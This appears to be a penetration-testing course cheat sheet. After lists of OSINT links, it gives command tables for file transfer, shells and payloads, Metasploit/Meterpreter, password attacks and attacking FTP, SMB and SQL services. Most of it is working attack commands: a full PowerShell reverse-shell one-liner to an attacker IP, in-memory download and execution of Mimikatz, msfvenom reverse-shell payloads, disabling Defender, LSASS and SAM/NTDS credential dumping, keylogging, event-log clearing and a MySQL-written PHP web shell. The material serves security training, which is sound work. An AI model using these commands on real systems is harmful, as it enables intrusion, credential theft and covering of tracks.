| [AWS IP Ranges](https://ip-ranges.amazonaws.com/ip-ranges.json) |
| [IP2Provider.py](https://github.com/oldrho/ip2provider) |
| [https://buckets.grayhatwarfare.com/](https://buckets.grayhatwarfare.com/) |
| [https://builtwith.com/](https://builtwith.com/) |
| [https://www.shodan.io/](https://www.shodan.io/) |
| [https://archive.org/](https://archive.org/) |
| [https://archive.fo/](https://archive.fo/) |

|**Files**|
|-|
| [https://www.virustotal.com/gui/](https://www.virustotal.com/gui/) |
| [http://archive.fo/](http://archive.fo/) |
| [https://pastebin.com/](https://pastebin.com/) |
| [Exiftool](https://github.com/exiftool/exiftool) |

|**Social Networks**|
|-|
| [https://twitter.com/](https://twitter.com) |
| [https://www.linkedin.com/](https://www.linkedin.com) |
| [https://www.instagram.com/](https://www.instagram.com/) |
| [https://www.snapchat.com/](https://www.snapchat.com/) |
| [https://www.youtube.com/](https://www.youtube.com/) |
| [https://www.wechat.com/](https://www.wechat.com) |
| [https://www.facebook.com/](https://www.facebook.com/) |

|**Search Engines**|
|-|
| [https://www.google.com/](https://www.google.com/) |
| [https://www.bing.com/](https://www.bing.com/) |
| [https://yahoo.com](https://yahoo.com) |
| [https://www.baidu.com/](https://www.baidu.com/) |
| [https://yandex.ru/](https://yandex.ru/) |
| [https://duckduckgo.com/](https://duckduckgo.com/) |
| [https://ask.com](https://ask.com) |
| [https://www.ecosia.org/](https://www.ecosia.org/) |
| [https://www.aol.de](https://www.aol.de) |
| [https://archive.org/](https://archive.org/) |
| [https://allpeople.com/](https://allpeople.com/) |
| [https://hunter.io/](https://hunter.io/) |
| [https://emailrep.io/](https://emailrep.io/) |
| [https://rocketreach.co/](https://rocketreach.co/) |
| [https://www.crunchbase.com/](https://www.crunchbase.com/) |
| [https://finance.yahoo.com/](https://finance.yahoo.com/) |
| [https://tineye.com/](https://tineye.com/) |
| [https://images.google.com/](https://images.google.com/) |
| [https://app.neilpatel.com/en/seo_analyzer/backlinks](https://app.neilpatel.com/en/seo_analyzer/backlinks) |
| [https://www.virustotal.com/gui/](https://www.virustotal.com/gui/) |
| [theHarvester.py](https://github.com/laramies/theHarvester) |
| [h8mail.py](https://github.com/khast3x/h8mail) |
| [https://securitytrails.com/](https://securitytrails.com/) |

|**Development Platforms**|
|-|
| [https://github.com/](https://github.com/) |
| [https://about.gitlab.com/](https://about.gitlab.com/) |
| [https://code.google.com/](https://code.google.com/) |
| [https://bitbucket.org/](https://bitbucket.org/) |
| [https://searchcode.com/](https://searchcode.com/) |
| [https://pastebin.com/](https://pastebin.com/) |

|**Forums**|
|-|
| [https://www.reddit.com/](https://www.reddit.com/) |
| [https://stackoverflow.com/](https://stackoverflow.com/) |
| [https://quora.com/](https://quora.com/) |
| [https://www.sitepoint.com/](https://www.sitepoint.com/community/) |
| [https://www.codeproject.com/](https://www.codeproject.com/) |
| [https://teamtreehouse.com/](https://teamtreehouse.com) |
| [https://stackexchange.com/](https://stackexchange.com/) |

|**Leak Resources**|
|-|
| [Rapid7 FDNS Databases](https://opendata.rapid7.com/sonar.fdns_v2/) |
| [https://haveibeenpwned.com/](https://haveibeenpwned.com/) |
| [http://archive.fo/](http://archive.fo/) |
| [https://archive.org/](https://archive.org/) |
| [https://www.cvedetails.com/](https://www.cvedetails.com/) |
| [https://www.exploit-db.com/](https://www.exploit-db.com/) |
| [https://vuldb.com/](https://vuldb.com/) |
| [https://cve.mitre.org/](https://cve.mitre.org/) |
| [https://www.securityfocus.com/](https://www.securityfocus.com/) |

# Vulnerability Assessment

## 14. Vulnerability Assessment
## 15. File Transfers

### Cheatsheet

| **Command** | **Description** |
| --------------|-------------------|
| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1` | Download a file with PowerShell |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`  | Execute a file in memory using PowerShell |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64` | Upload a file with PowerShell |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe` | Download a file using Bitsadmin |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe` | Download a file using Certutil |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh` | Download a file using Wget |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` | Download a file using cURL |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'` | Download a file using PHP |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Upload a file using SCP |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file using SCP |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |

## 16. Shells & Payloads

### Cheatsheet

|**Commands** |**Description**|
|---|---|
| `xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!` | CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol |
| `env` | Works with many different command language interpreters to discover the environmental variables of a system. This is a great way to find out which shell language is in use |
| `sudo nc -lvnp <port #>` | Starts a `netcat` listener on a specified port |
| `nc -nv <ip address of computer with listener started><port being listened on>` | Connects to a netcat listener at the specified IP address and port |
| `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc -l 10.129.41.200 7777 > /tmp/f` | Uses netcat to bind a shell (`/bin/bash`) the specified IP address and port. This allows for a shell session to be served remotely to anyone connecting to the computer this command has been issued on |
| `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` | `Powershell` one-liner used to connect back to a listener that has been started on an attack box |
| `Set-MpPreference -DisableRealtimeMonitoring $true` | Powershell command using to disable real time monitoring in `Windows Defender` |
| `use exploit/windows/smb/psexec` | Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing `smb` & `psexec` |
| `shell` | Command used in a meterpreter shell session to drop into a `system shell` |
| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf` | `MSFvenom` command used to generate a linux-based reverse shell `stageless payload` |
| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe` | MSFvenom command used to generate a Windows-based reverse shell stageless payload |
| `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho` | MSFvenom command used to generate a MacOS-based reverse shell payload |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp` | MSFvenom command used to generate a ASP web reverse shell payload |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp` | MSFvenom command used to generate a JSP web reverse shell payload |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war` | MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload |
| `use auxiliary/scanner/smb/smb_ms17_010` | Metasploit exploit module used to check if a host is vulnerable to `ms17_010` |
| `use exploit/windows/smb/ms17_010_psexec` | Metasploit exploit module used to gain a reverse shell session on a Windows-based system that is vulnerable to ms17_010 |
| `use exploit/linux/http/rconfig_vendors_auth_file_upload_rce` | Metasploit exploit module that can be used to optain a reverse shell on a vulnerable linux system hosting `rConfig 3.9.6` |
| `python -c 'import pty; pty.spawn("/bin/sh")'` | Python command used to spawn an `interactive shell` on a linux-based system |
| `/bin/sh -i` | Spawns an interactive shell on a linux-based system |
| `perl —e 'exec "/bin/sh";'` | Uses `perl` to spawn an interactive shell on a linux-based system |
| `ruby: exec "/bin/sh"` | Uses `ruby` to spawn an interactive shell on a linux-based system |
| `Lua: os.execute('/bin/sh')` | Uses `Lua` to spawn an interactive shell on a linux-based system |
| `awk 'BEGIN {system("/bin/sh")}'` | Uses `awk` command to spawn an interactive shell on a linux-based system |
| `find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;` | Uses `find` command to spawn an interactive shell on a linux-based system |
| `find . -exec /bin/sh \; -quit` | An alternative way to use the `find` command to spawn an interactive shell on a linux-based system |
| `vim -c ':!/bin/sh'` | Uses the text-editor `VIM` to spawn an interactive shell. Can be used to escape "jail-shells" |
| `ls -la <path/to/fileorbinary>` | Used to `list` files & directories on a linux-based system and shows the permission for each file in the chosen directory. Can be used to look for binaries that we have permission to execute |
| `sudo -l` | Displays the commands that the currently logged on user can run as `sudo` |
| `/usr/share/webshells/laudanum` | Location of `laudanum webshells` on ParrotOS and Pwnbox |
| `/usr/share/nishang/Antak-WebShell` | Location of `Antak-Webshell` on Parrot OS and Pwnbox |

## 17. Using the Metasploit-Framework

### Cheatsheet

#### MSFconsole Commands 

| **Command**        | **Description** |
| :--------------- | :----------------------------------------------------------- |
| `show exploits` | Show all exploits within the Framework.                      |
| `show payloads`  | Show all payloads within the Framework.                      |
| `show auxiliary` | Show all auxiliary modules within the Framework.             |
| `search <name>` | Search for exploits or modules within the Framework.         |
| `info`         | Load information about a specific exploit or module.         |
| `use <name>` | Load an exploit or module (example: use windows/smb/psexec). |
| `use <number>` | Load an exploit by using the index number displayed after the search command. |
| `LHOST`        | Your local host’s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells. |
| `RHOST`        | The remote host or the target. set function Set a specific value (for example, LHOST or RHOST). |
| `setg <function>` | Set a specific value globally (for example, LHOST or RHOST). |
| `show options` | Show the options available for a module or exploit.          |
| `show targets` | Show the platforms supported by the exploit.                 |
| `set target <number>` | Specify a specific target index if you know the OS and service pack. |
| `set payload <payload>` | Specify the payload to use. |
| `set payload <number>` | Specify the payload index number to use after the show payloads command. |
| `show advanced` | Show advanced options. |
| `set autorunscript migrate -f` | Automatically migrate to a separate process upon exploit completion. |
| `check` | Determine whether a target is vulnerable to an attack. |
| `exploit` | Execute the module or exploit and attack the target. |
| `exploit -j` | Run the exploit under the context of the job. (This will run the exploit in the background.) |
| `exploit -z` | Do not interact with the session after successful exploitation. |
| `exploit -e <encoder>` | Specify the payload encoder to use (example: exploit –e shikata_ga_nai). |
| `exploit -h` | Display help for the exploit command. |
| `sessions -l` | List available sessions (used when handling multiple shells). |
| `sessions -l -v` | List all available sessions and show verbose fields, such as which vulnerability was used when exploiting the system. |
| `sessions -s <script>` | Run a specific Meterpreter script on all Meterpreter live sessions. |
| `sessions -K` | Kill all live sessions. |
| `sessions -c <cmd>` | Execute a command on all live Meterpreter sessions. |
| `sessions -u <sessionID>` | Upgrade a normal Win32 shell to a Meterpreter console. |
| `db_create <name>` | Create a database to use with database-driven attacks (example: db_create autopwn). |
| `db_connect <name>` | Create and connect to a database for driven attacks (example: db_connect autopwn). |
| `db_nmap` | Use Nmap and place results in a database. (Normal Nmap syntax is supported, such as –sT –v –P0.) |
| `db_destroy` | Delete the current database. |
| `db_destroy  <user:password@host:port/database>` | Delete database using advanced options. |

#### Meterpreter Commands 

| **Command**                                                     | **Description**                                                  |
| :---------------------------------------------------------- | :----------------------------------------------------------- |
| `help`                                                      | Open Meterpreter usage help.                                 |
| `run <scriptname>`                                        | Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory. |
| `sysinfo`                                                   | Show the system information on the compromised target.       |
| `ls`                                                        | List the files and folders on the target.                    |
| `use priv`                                                  | Load the privilege extension for extended Meterpreter libraries. |
| `ps`                                                        | Show all running processes and which accounts are associated with each process. |
| `migrate <proc. id>`                                      | Migrate to the specific process ID (PID is the target process ID gained from the ps command). |
| `use incognito`                                             | Load incognito functions. (Used for token stealing and impersonation on a target machine.) |
| `list_tokens -u`                                            | List available tokens on the target by user.                 |
| `list_tokens -g`                                            | List available tokens on the target by group.                |
| `impersonate_token <DOMAIN_NAMEUSERNAME>`               | Impersonate a token available on the target.                 |
| `steal_token <proc. id>`                                  | Steal the tokens available for a given process and impersonate that token. |
| `drop_token`                                                | Stop impersonating the current token.                        |
| `getsystem`                                                 | Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors. |
| `shell`                                                     | Drop into an interactive shell with all available tokens.    |
| `execute -f <cmd.exe> -i`                                 | Execute cmd.exe and interact with it.                        |
| `execute -f <cmd.exe> -i -t`                              | Execute cmd.exe with all available tokens.                   |
| `execute -f <cmd.exe> -i -H -t`                           | Execute cmd.exe with all available tokens and make it a hidden process. |
| `rev2self`                                                  | Revert back to the original user you used to compromise the target. |
| `reg <command>`                                           | Interact, create, delete, query, set, and much more in the target’s registry. |
| `setdesktop <number>`                                     | Switch to a different screen based on who is logged in.      |
| `screenshot`                                                | Take a screenshot of the target’s screen.                    |
| `upload <filename>`                                       | Upload a file to the target.                                 |
| `download <filename>`                                     | Download a file from the target.                             |
| `keyscan_start`                                             | Start sniffing keystrokes on the remote target.              |
| `keyscan_dump`                                              | Dump the remote keys captured on the target.                 |
| `keyscan_stop`                                              | Stop sniffing keystrokes on the remote target.               |
| `getprivs`                                                  | Get as many privileges as possible on the target.            |
| `uictl enable <keyboard/mouse>`                           | Take control of the keyboard and/or mouse.                   |
| `background`                                                | Run your current Meterpreter shell in the background.        |
| `hashdump`                                                  | Dump all hashes on the target. use sniffer Load the sniffer module. |
| `sniffer_interfaces`                                        | List the available interfaces on the target.                 |
| `sniffer_dump <interfaceID> pcapname`                     | Start sniffing on the remote target.                         |
| `sniffer_start <interfaceID> packet-buffer`               | Start sniffing with a specific range for a packet buffer.    |
| `sniffer_stats <interfaceID>`                             | Grab statistical information from the interface you are sniffing. |
| `sniffer_stop <interfaceID>`                              | Stop the sniffer.                                            |
| `add_user <username> <password> -h <ip>`              | Add a user on the remote target.                             |
| `add_group_user <"Domain Admins"> <username> -h <ip>` | Add a username to the Domain Administrators group on the remote target. |
| `clearev`                                                   | Clear the event log on the target machine.                   |
| `timestomp`                                                 | Change file attributes, such as creation date (antiforensics measure). |
| `reboot`                                                    | Reboot the target machine.                                   |


# Exploitation

## 18. Password Attacks

### Cheatsheet

#### Connecting to Target

| **Command**| **Description**|
|-|-|
| `xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!` | CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol. |
| `evil-winrm -i <ip> -u user -p password`            | Uses Evil-WinRM to establish a Powershell session with a target. |
| `ssh user@<ip>`                                     | Uses SSH to connect to a target using a specified user.      |
| `smbclient -U user \\\\<ip>\\SHARENAME`             | Uses smbclient to connect to an SMB share using a specified user. |
| `python3 smbserver.py -smb2support CompData /home/<nameofuser>/Documents/` | Uses smbserver.py to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host. |

#### Password Mutations

| **Command**| **Description**|
|-|-|
| `cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist` | Uses cewl to generate a wordlist based on keywords present on a website. |
| `hashcat --force password.list -r custom.rule --stdout > mut_password.list` | Uses Hashcat to generate a rule-based word list.             |
| `./username-anarchy -i /path/to/listoffirstandlastnames.txt` | Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username. |
| `curl -s https://fileinfo.com/filetypes/compressed \| html2text \| awk '{print tolower($1)}' \| grep "\." \| tee -a compressed_ext.txt` | Uses Linux-based commands curl, awk, grep and tee to download a list of file extensions to be used in searching for files that could contain passwords. |

#### Remote Password Attacks

| **Command**| **Description**|
|-|-|
| `crackmapexec winrm <ip> -u user.list -p password.list` | Uses CrackMapExec over WinRM to attempt to brute force user names and passwords specified hosted on a target. |
| `crackmapexec smb <ip> -u "user" -p "password" --shares` | Uses CrackMapExec to enumerate smb shares on a target using a specified set of credentials. |
| `hydra -L user.list -P password.list <service>://<ip>`       | Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service. |
| `hydra -l username -P password.list <service>://<ip>`       | Uses Hydra in conjunction with a username and password list to attempt to crack a password over the specified service. |
| `hydra -l user.list -p password <service>://<ip>`       | Uses Hydra in conjunction with a user list and password to attempt to crack a password over the specified service. |
| `hydra -C <user_pass.list> ssh://<IP>`                       | Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack. |
| `crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam` | Uses CrackMapExec in conjunction with admin credentials to dump password hashes stored in SAM, over the network. |
| `crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa` | Uses CrackMapExec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way. |
| `crackmapexec smb <ip> -u <username> -p <password> --ntds` | Uses CrackMapExec in conjunction with admin credentials to dump hashes from the ntds file over a network. |
| `evil-winrm -i <ip>  -u  Administrator -H "<passwordhash>"` | Uses Evil-WinRM to establish a Powershell session with a Windows target using a user and password hash. This is one type of `Pass-The-Hash` attack. |

#### Windows Local Password Attacks

| **Command**| **Description**|
|-|-|
| `tasklist /svc`                                              | A command-line-based utility in Windows used to list running processes. |
| `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml` | Uses Windows command-line based utility findstr to search for the string "password" in many different file type. |
| `Get-Process lsass`                                          | A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line. |
| `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full` | Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials. |
| `pypykatz lsa minidump /path/to/lsassdumpfile`               | Uses Pypykatz to parse and attempt to extract credentials & password hashes from an LSASS process memory dump file. |
| `reg.exe save hklm\sam C:\sam.save`                          | Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\sam, hklm\security, hklm\system). |
| `move sam.save \\<ip>\NameofFileShare`                  | Uses move in Windows to transfer a file to a specified file share over the network. |
| `python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL` | Uses Secretsdump.py to dump password hashes from the SAM database. |
| `vssadmin CREATE SHADOW /For=C:`                             | Uses Windows command line based tool vssadmin to create a volume shadow copy for `C:`. This can be used to make a copy of NTDS.dit safely. |
| `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit` | Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of `C:`. |

#### Linux Local Password Attacks

| **Command**| **Description**|
|-|-|
| `for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done` | Script that can be used to find .conf, .config and .cnf files on a Linux system. |
| `for i in $(find / -name *.cnf 2>/dev/null \| grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null \| grep -v "\#";done` | Script that can be used to find credentials in specified file types. |
| `for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share\|man";done` | Script that can be used to find common database files.       |
| `find /home/* -type f -name "*.txt" -o ! -name "*.*"`        | Uses Linux-based find command to search for text files.      |
| `for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share";done` | Script that can be used to search for common file types used with scripts. |
| `for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done` | Script used to look for common types of documents.           |
| `cat /etc/crontab`                                           | Uses Linux-based cat command to view the contents of crontab in search for credentials. |
| `ls -la /etc/cron.*/`                                        | Uses Linux-based  ls -la command to list all files that start with `cron` contained in the etc directory. |
| `grep -rnw "PRIVATE KEY" /* 2>/dev/null \| grep ":1"`        | Uses Linux-based command grep to search the file system for key terms `PRIVATE KEY` to discover SSH keys. |
| `grep -rnw "PRIVATE KEY" /home/* 2>/dev/null \| grep ":1"`    | Uses Linux-based grep command to search for the keywords `PRIVATE KEY` within files contained in a user's home directory. |
| `grep -rnw "ssh-rsa" /home/* 2>/dev/null \| grep ":1"`        | Uses Linux-based grep command to search for keywords `ssh-rsa` within files contained in a user's home directory. |
| `tail -n5 /home/*/.bash*`                                   | Uses Linux-based tail command to search the through bash history files and output the last 5 lines. |
| `python3 mimipenguin.py`                                     | Runs Mimipenguin.py using python3.                           |
| `bash mimipenguin.sh`                                       | Runs Mimipenguin.sh using bash.                              |
| `python2.7 lazagne.py all`                                   | Runs Lazagne.py with all modules using python2.7             |
| `ls -l .mozilla/firefox/ \| grep default `                    | Uses Linux-based command to search for credentials stored by Firefox then searches for the keyword `default` using grep. |
| `cat .mozilla/firefox/1bplpd86.default-release/logins.json \| jq .` | Uses Linux-based command cat to search for credentials stored by Firefox in JSON. |
| `python3.9 firefox_decrypt.py`                               | Runs Firefox_decrypt.py to decrypt any encrypted credentials stored by Firefox. Program will run using python3.9. |
| `python3 lazagne.py browsers`                                | Runs Lazagne.py browsers module using Python 3.               |

#### Cracking Passwords

| **Command**| **Description**|
|-|-|
| `hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt` | Uses Hashcat to crack NTLM hashes using a specified wordlist. |
| `hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show` | Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output. |
| `unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes` | Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking. |
| `hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked` | Uses Hashcat in conjunction with a wordlist to crack the unshadowed hashes and outputs the cracked hashes to a file called unshadowed.cracked. |
| ` hashcat -m 500 -a 0 md5-hashes.list rockyou.txt`           | Uses Hashcat in conjunction with a word list to crack the md5 hashes in the md5-hashes.list file. |
| `hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked` | Uses Hashcat to crack the extracted BitLocker hashes using a wordlist and outputs the cracked hashes into a file called backup.cracked. |
| `ssh2john.pl SSH.private > ssh.hash`         | Runs Ssh2john.pl script to generate hashes for the SSH keys in the SSH.private file, then redirects the hashes to a file called ssh.hash. |
| `john ssh.hash --show`                                       | Uses John to attempt to crack the hashes in the ssh.hash file, then outputs the results in the terminal. |
| `office2john.py Protected.docx > protected-docx.hash`        | Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash. |
| `john --wordlist=rockyou.txt protected-docx.hash`            | Uses John in conjunction with the wordlist rockyou.txt to crack the hash protected-docx.hash. |
| `pdf2john.pl PDF.pdf > pdf.hash`                       | Runs Pdf2john.pl script to convert a pdf file to a pdf has to be cracked. |
| `john --wordlist=rockyou.txt pdf.hash`                       | Runs John in conjunction with a wordlist to crack a pdf hash. |
| `zip2john ZIP.zip > zip.hash`                                | Runs Zip2john against a zip file to generate a hash, then adds that hash to a file called zip.hash. |
| `john --wordlist=rockyou.txt zip.hash`                       | Uses John in conjunction with a wordlist to crack the hashes contained in zip.hash. |
| `bitlocker2john -i Backup.vhd > backup.hashes`               | Uses Bitlocker2john script to extract hashes from a VHD file and directs the output to a file called backup.hashes. |
| `file GZIP.gzip`                                             | Uses the Linux-based file tool to gather file format information. |
| `for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null \| tar xz;done` | Script that runs a for-loop to extract files from an archive. |


## Cracking Passwords with Hashcat

### Cheatsheet

| **Command** | **Description** |
| --------------|-------------------|
| `pip install hashid` | Install the `hashid` tool |
| `hashid <hash>` OR `hashid <hashes.txt>` | Identify a hash with the `hashid` tool |
| `hashcat --example-hashes` | View a list of `Hashcat` hash modes and example hashes |
| `hashcat -b -m <hash mode>` | Perform a `Hashcat` benchmark test of a specific hash mode |
| `hashcat -b` | Perform a benchmark of all hash modes |
| `hashcat -O` | Optimization: Increase speed but limit potential password length |
| `hashcat -w 3` | Optimization: Use when Hashcat is the only thing running, use 1 if running hashcat on your desktop.  Default is 2 |
| `hashcat -a 0 -m <hash type> <hash file> <wordlist>` | Dictionary attack |
| `hashcat -a 1 -m <hash type> <hash file> <wordlist1> <wordlist2>` | Combination attack |
| `hashcat -a 3 -m 0 <hash file> -1 01 'ILFREIGHT?l?l?l?l?l20?1?d'` | Sample Mask attack |
| `hashcat -a 7 -m 0 <hash file> -1=01 '20?1?d' rockyou.txt` | Sample Hybrid attack |
| `crunch <minimum length> <maximum length> <charset> -t <pattern> -o <output file>` | Make a wordlist with `Crunch` |
| `python3 cupp.py -i` | Use `CUPP` interactive mode |
| `kwp -s 1 basechars/full.base keymaps/en-us.keymap  routes/2-to-10-max-3-direction-changes.route` | `Kwprocessor` example |
| `cewl -d <depth to spider> -m <minimum word length> -w <output wordlist> <url of website>` | Sample `CeWL` command |
| `hashcat -a 0 -m 100 hash rockyou.txt -r rule.txt` | Sample `Hashcat` rule syntax |
| `./cap2hccapx.bin input.cap output.hccapx` | `cap2hccapx` syntax |
| `hcxpcaptool -z pmkidhash_corp cracking_pmkid.cap ` | `hcxpcaptool`syntax |

## 19. Attacking Common Services

### Cheatsheet

#### Attacking FTP

|**Command**|**Description**|
|-|-|
| `ftp 192.168.2.142` | Connecting to the FTP server using the `ftp` client. |
| `nc -v 192.168.2.142 21` | Connecting to the FTP server using `netcat`. |
| `hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142` | Brute-forcing the FTP service. |

#### Attacking SMB

|**Command**|**Description**|
|-|-|
| `smbclient -N -L //10.129.14.128` | Null-session testing against the SMB service. |
| `smbmap -H 10.129.14.128` | Network share enumeration using `smbmap`. |
| `smbmap -H 10.129.14.128 -r notes` | Recursive network share enumeration using `smbmap`. |
| `smbmap -H 10.129.14.128 --download "notes\note.txt"` | Download a specific file from the shared folder. |
| `smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"` | Upload a specific file to the shared folder. |
| `rpcclient -U'%' 10.10.110.17` | Null-session with the `rpcclient`. |
| `./enum4linux-ng.py 10.10.11.45 -A -C` | Automated enumeratition of the SMB service using `enum4linux-ng`. |
| `crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'` | Password spraying against different users from a list. |
| `impacket-psexec administrator:'Password123!'@10.10.110.17` | Connect to the SMB service using the `impacket-psexec`. |
| `crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec` | Execute a command over the SMB service using `crackmapexec`. |
| `crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users` | Enumerating Logged-on users. |
| `crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam` | Extract hashes from the SAM database. |
| `crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE` | Use the Pass-The-Hash technique to authenticate on the target host. |
| `impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146` | Dump the SAM database using `impacket-ntlmrelayx`. |
| `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>` | Execute a PowerShell based reverse shell using `impacket-ntlmrelayx`. |

#### Attacking SQL Databases

|**Command**|**Description**|
|-|-|
| `mysql -u julio -pPassword123 -h 10.129.20.13` | Connecting to the MySQL server. |
| `sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30` | Connecting to the MSSQL server.  |
| `sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h` | Connecting to the MSSQL server from Linux.  |
| `sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h` | Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server. |
| `mysql> SHOW DATABASES;` | Show all available databases in MySQL. |
| `mysql> USE htbusers;` | Select a specific database in MySQL. |
| `mysql> SHOW TABLES;` | Show all available tables in the selected database in MySQL. |
| `mysql> SELECT * FROM users;` | Select all available entries from the "users" table in MySQL. |
| `sqlcmd> SELECT name FROM master.dbo.sysdatabases` | Show all available databases in MSSQL. |
| `sqlcmd> USE htbusers` | Select a specific database in MSSQL. |
| `sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES` | Show all available tables in the selected database in MSSQL. |
| `sqlcmd> SELECT * FROM users` | Select all available entries from the "users" table in MSSQL. |
| `sqlcmd> EXECUTE sp_configure 'show advanced options', 1` | To allow advanced options to be changed. |
| `sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1` | To enable the xp_cmdshell. |
| `sqlcmd> RECONFIGURE` | To be used after each sp_configure command to apply the changes. |
| `sqlcmd> xp_cmdshell 'whoami'` | Execute a system command from MSSQL server. |
| `mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'` | Create a file using MySQL. |
